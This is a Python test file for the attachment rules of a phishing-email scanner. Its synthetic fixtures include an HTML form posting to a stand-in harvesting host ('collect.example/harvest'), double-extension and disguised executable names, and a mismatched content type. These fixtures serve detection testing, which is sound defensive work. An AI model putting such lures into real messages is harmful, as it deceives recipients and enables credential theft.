"""Attachment rule tests."""

from __future__ import annotations

from baittrace.config import Config
from baittrace.parse import parse_bytes
from baittrace.pipeline import scan

from ..conftest import CORPUS, fired, scan_eml


def _html_attachment(filename: str, html: str, declared: str = "text/html") -> bytes:
    return (
        "From: alice@corp.example\r\n"
        "To: bob@corp.example\r\n"
        "Subject: files\r\n"
        "Date: Thu, 07 Aug 2026 08:04:58 +0000\r\n"
        "Message-ID: <x@corp.example>\r\n"
        "MIME-Version: 1.0\r\n"
        f'Content-Type: {declared}; name="{filename}"\r\n'
        f'Content-Disposition: attachment; filename="{filename}"\r\n'
        "\r\n"
        f"{html}\r\n"
    ).encode()


class TestATT001:
    def test_fires_when_declared_type_disagrees(self) -> None:
        report = scan_eml(
            _html_attachment(
                "invoice.pdf",
                "<html><body><p>not a pdf</p></body></html>",
                declared="application/pdf",
            )
        )
        assert "ATT001" in fired(report)

    def test_quiet_when_types_agree(self) -> None:
        report = scan_eml(_html_attachment("note.html", "<html><body><p>hello</p></body></html>"))
        assert "ATT001" not in fired(report)


class TestATT003:
    def test_fires_on_an_html_form(self) -> None:
        report = scan_eml(
            _html_attachment(
                "invoice.html",
                '<html><body><form action="http://collect.example/harvest"><input></form></body></html>',
            )
        )
        assert "ATT003" in fired(report)

    def test_quiet_on_html_without_a_form(self) -> None:
        report = scan_eml(_html_attachment("note.html", "<html><body><p>hello</p></body></html>"))
        assert "ATT003" not in fired(report)


class TestATT005:
    def test_corpus_homograph_sample_fires(self) -> None:
        report = scan(CORPUS / "malicious" / "homograph-attachment.eml", Config(deterministic=True))
        assert "ATT005" in fired(report)
        assert "ATT003" in fired(report)


class TestATT002:
    def test_fires_on_a_double_extension(self) -> None:
        report = scan_eml(_html_attachment("invoice.pdf.exe", "MZ this is not really an exe"))
        assert "ATT002" in fired(report)


class TestATT004:
    def test_fires_on_an_exe_name(self) -> None:
        report = scan_eml(_html_attachment("setup.exe", "MZ\x90\x00not-a-real-pe"))
        assert "ATT004" in fired(report)


class TestFlags:
    def test_parse_records_form_action(self) -> None:
        message = parse_bytes(
            _html_attachment(
                "invoice.html",
                '<form action="http://collect.example/harvest" method="post"></form>',
            )
        )
        assert message.attachments
        assert message.attachments[0].has_html_form
        assert "collect.example" in message.attachments[0].form_action
